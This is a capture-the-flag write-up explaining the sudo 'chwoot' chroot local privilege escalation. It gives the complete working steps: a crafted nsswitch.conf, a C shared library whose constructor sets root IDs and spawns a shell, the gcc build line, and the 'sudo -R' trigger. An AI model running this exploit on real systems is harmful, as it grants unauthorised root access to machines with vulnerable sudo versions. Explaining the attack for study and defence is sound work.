---
title: FahemSec CTF - warden
draft: false
date: 2026-08-01
---
This is a really interesting challenge that involves exploiting a certain version of `sudo`.
This was part of "FahemSec CTF 2026".

---
So once we launch the instance we are greeted with the following:

![[Pasted image 20260801185051.png]]

Which mentions that there's a copy of `sudo` installed... hmm kinda suspicious.

So then we can check out what version of `sudo` is used here:

![[Pasted image 20260801185108.png]]

We can then take that version and go ask our bestfriend, google, if there's anything related to it.
And literally the first result we see is:

![[Pasted image 20260801185130.png]]

Here's the link for anyone interested:
https://www.sentrium.co.uk/labs/sudo-chwoot-1-9-17-local-privilege-escalation

Basically, to simplify everything, certain versions of `sudo` (this one included) are prone to a `chwoot` attack which exploits the `-R` option of `sudo`.

In the mentioned versions of `sudo`, the `-R` (also known as `--chroot`) option changes the root before running the command that we specify:

![[Pasted image 20260801185148.png]]

The thing is, `sudo` doesn't actually check if we have the required permissions before changing our root, it just does it anyways so it changes the root and THEN runs the command.

Now an interesting thing happens when `sudo` changes our root directory, it loads the file in `/etc/nsswitch.conf` (see: [Name Service Switch](https://en.wikipedia.org/wiki/Name_Service_Switch)) from within the new root directory. This allows us to put whatever we want in that file and it would be loaded.

Here's we are going to exploit this challenge:

First we can make our malicious directories using `mkdir -p woot/etc libnss_`

Then we put this in the file that we mentioned `woot/etc/nsswitch.conf` but inside:
```
passwd: /woot1337
```

This tells glibc where to look when it needs to check information about users. Here, glibc will interpret our entry as an NSS module name and it would look for that module in the directory that we created `libnss_`.

So all in all, it would look for the `libnss_/woot1337.so.2` module.

We aren't done yet, we have the most important part yet to create, the module.

We can create a file called `exploit.c` and put the following in it:
```C
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void){
	setreuid(0,0);
	setregid(0,0);
	chdir("/");
	execl("/bin/sh","sh","-c","/bin/sh",NULL);
	
}
```
Here we `constructor` basically tells GCC to run this function automatically once the shared library is loaded.

Then inside this function we change our real user and group IDs to `0` effectively making us root.

We then change our directory to the root directory and get a shell.

BOOM, pwned.

Well, almost. We still need to compile this library.

We can do so like this:
```bash
gcc -shared -fPIC -o libnss_/woot1337.so.2 exploit.c
```

This creates our shared library. BOOM! Haha, not yet.

We still need to actually use the `-R` option, remember that? The option that this whole thing is about?

Anyways.

After having everything in place we can run:
```bash
sudo -R woot woot
```

This changes our root to `woot` that we created. The second `woot` is just a dummy one, doesn't matter much, our exploit runs before it even gets to trying to run the second `woot`.

And this is it! We get a shell as `root` and we cat the flag!

> [!info] Note
> The exploit was successfully verified locally. The remote instance unfortunately kept terminating during the compilation step, preventing flag retrieval. The exploitation technique itself is fully demonstrated above."

![[Pasted image 20260801193301.png]]

---
PoC credit:\
https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/blob/main/sudo-chwoot.sh